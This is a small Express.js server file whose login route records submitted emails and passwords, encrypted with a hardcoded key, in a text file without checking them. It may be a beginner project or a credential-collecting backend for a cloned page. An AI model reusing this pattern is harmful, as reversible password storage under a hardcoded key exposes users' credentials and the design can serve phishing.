const fs = require("fs");
const express = require("express");
const crypto = require("crypto");
const path = require("path");
const app = express();

app.use(express.urlencoded({ extended: true }));

// Serve your MCC HTML
app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "index.html"));
});

// Encryption key
const SECRET_KEY = crypto
  .createHash("sha256")
  .update("my-secret-key")
  .digest();

const ALGO = "aes-256-cbc";

function encrypt(text) {
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipheriv(ALGO, SECRET_KEY, iv);
    let encrypted = cipher.update(text, "utf8", "base64");
    encrypted += cipher.final("base64");
    return iv.toString("base64") + ":" + encrypted;
}

// Handle login
app.post("/login", (req, res) => {
    const { email, password } = req.body;

    const raw = `email=${email}; password=${password}`;
    const encryptedLine = encrypt(raw);

    fs.appendFileSync("users.enc.txt", encryptedLine + "\n");

    res.send("Saved to encrypted TXT.");
});

app.listen(3000, () => console.log("Server running on port 3000"));
